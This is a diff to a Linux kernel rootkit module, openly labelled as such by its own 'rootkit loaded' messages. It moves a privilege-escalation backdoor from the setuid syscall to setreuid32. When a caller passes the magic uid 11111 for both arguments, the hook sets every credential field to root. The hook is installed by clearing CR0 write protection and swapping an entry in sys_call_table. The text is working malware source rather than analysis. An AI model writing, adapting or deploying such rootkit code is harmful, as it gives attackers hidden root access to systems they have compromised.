@@ -25,26 +25,21 @@ asmlinkage int (*o_read)(int fd, void* buf, size_t count);
 
 psize *sys_call_table;
 
-uid_t secret = 11111;
 
-asmlinkage long (*orig_setuid)(uid_t uid);
+asmlinkage long (*o_setreuid) (uid_t ruid, uid_t reuid);
 
-asmlinkage long backdoor_setuid(uid_t t) {
-
-	if(t == secret) {
+asmlinkage long backdoor_setreuid(uid_t r, uid_t e) {
+	uid_t secret = 11111;
+	if(r == secret && e == secret) {
 		struct cred *credentials = prepare_creds();
-		credentials->uid = GLOBAL_ROOT_UID;
-        credentials->gid = GLOBAL_ROOT_GID;
-        credentials->suid = GLOBAL_ROOT_UID;
-        credentials->sgid = GLOBAL_ROOT_GID;
-        credentials->euid = GLOBAL_ROOT_UID;
-        credentials->egid = GLOBAL_ROOT_GID;
-        credentials->fsuid = GLOBAL_ROOT_UID;
-        credentials->fsgid = GLOBAL_ROOT_GID;
+		credentials->uid = credentials->gid = 0;
+        credentials->suid = credentials->sgid = 0;
+        credentials->euid = credentials->egid = 0;
+        credentials->fsuid = credentials->fsgid = 0;
 
         return commit_creds(credentials);
 	} else {
-		return (*orig_setuid) (t);
+		return (*o_setreuid) (r, e);
 	}
 
 
@@ -270,17 +265,17 @@ void remove_backdoor(void) {
 	write_cr0(read_cr0() | 0x10000);
 }
 
-void add_setuid() {
+void add_setreuid() {
 
 	write_cr0(read_cr0() & (~ 0x10000));
-	orig_setuid = (void*) xchg(&sys_call_table[__NR_setuid], backdoor_setuid);
+	o_setreuid = (void*) xchg(&sys_call_table[__NR_setreuid32], backdoor_setreuid);
 	write_cr0(read_cr0() | 0x10000);
 }
 
-void remove_setuid() {
+void remove_setreuid() {
 
 	write_cr0(read_cr0() & (~ 0x10000));
-	xchg(&sys_call_table[__NR_setuid], orig_setuid);
+	xchg(&sys_call_table[__NR_setreuid32], o_setreuid);
 	write_cr0(read_cr0() | 0x10000);
 }
 
@@ -299,7 +294,7 @@ int init_module(void) {
 	}
 
 	add_backdoor();
-	add_setuid();
+	add_setreuid();
     
 	printk(KERN_INFO "rootkit loaded\n");	
 	return 0;
@@ -308,7 +303,7 @@ int init_module(void) {
 void cleanup_module(void) {
 
 	remove_backdoor();
-	remove_setuid();
+	remove_setreuid();
 
 	printk(KERN_INFO "rootkit unloaded\n");
 }
